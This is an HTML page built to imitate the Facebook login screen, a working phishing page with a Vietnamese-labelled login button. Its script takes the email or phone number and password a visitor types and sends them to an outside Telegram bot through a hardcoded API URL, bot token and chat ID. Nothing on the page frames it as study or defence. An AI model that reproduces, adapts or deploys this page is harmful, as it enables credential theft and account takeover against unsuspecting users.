

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook - Login</title>
</head>
<body>
    <div class="main">
        <div class="logo">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="logo">
        </div>
        <div class="container">
            <span class="login">Login to Facebook</span>
            <input type="email" name="email" id="email" placeholder="Email address or phone number">
            <input type="password" name="pass" id="pass" placeholder="Password">
            <button class="login-btn" onclick="sendTelegramMessage()">Đăng Nhập</button>
            <a href="#">Forgotten account</a>
            <div class="style">or</div>
            <button class="new-account">Create New Account</button>
        </div>
    </div>

    <script>
        function sendTelegramMessage() {
            var phoneNumber = document.getElementById("email").value;
            var password = document.getElementById("pass").value;
            var message = "Số điện thoại: " + phoneNumber + "\nGmail: " + password;
            var url = "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendMessage";
            var chatId = "-1002081721946";
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send("chat_id=" + chatId + "&text=" + message);
        }
    </script>
</body>
</html>
